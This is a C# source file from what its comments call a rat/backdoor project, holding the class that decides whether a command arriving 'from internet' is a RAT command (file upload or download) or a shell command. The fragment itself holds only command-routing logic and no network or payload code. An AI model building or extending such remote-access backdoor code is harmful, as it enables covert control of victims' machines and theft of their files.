using RAT.src.Interfaces;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace RAT.src.Rat
{
    /// <summary>
    /// Our rat/backdoor commands handling logic.
    /// </summary>
    public class RatCommandLogic : IRatCommandLogic
    {
        /// <summary>
        /// Currently available commands for our rat/backdoor.
        /// </summary>
        private List<string> _ratCommands = new List<string>()
            { "upload file", "download file" };

        /// <summary>
        /// Our command identifier, if this is found in our string command during receival as first word - then client wants
        /// to execute rat command, not shell command.
        /// </summary>
        private const string _ratCommandIdentifier = "RAT";

        /// <summary>
        /// Determines if first word of string is command for rat.
        /// </summary>
        /// <param name="command">Command from internet i.e "cd .." for shell, or "dir", whatever.</param>
        /// <returns>True if command is rat command, false is something else.</returns>
        public bool IsRatCommand(string command)
        {
            // Check if first word of string is our command identifier.
            return Regex.Replace(command.Split()[0], @"[^0-9a-zA-Z\ ]+", "") == _ratCommandIdentifier;
        }
    }
}